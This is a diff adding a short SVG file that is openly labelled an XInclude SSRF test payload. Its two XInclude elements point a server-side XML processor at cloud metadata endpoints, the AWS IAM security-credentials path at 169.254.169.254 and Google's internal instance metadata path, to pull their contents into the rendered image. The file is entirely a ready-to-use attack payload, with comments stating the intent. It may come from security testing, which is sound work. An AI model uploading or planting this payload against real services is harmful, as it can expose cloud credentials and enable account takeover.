@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xi="http://www.w3.org/2001/XInclude"
+     width="400" height="200">
+  <text x="10" y="40" fill="red">XInclude SSRF test</text>
+  <!-- Server-side SSRF: if XML processor has XInclude enabled -->
+  <xi:include href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" parse="text"/>
+  <!-- Also try internal CF metadata -->
+  <xi:include href="http://metadata.google.internal/computeMetadata/v1/instance/" parse="text"/>
+</svg>
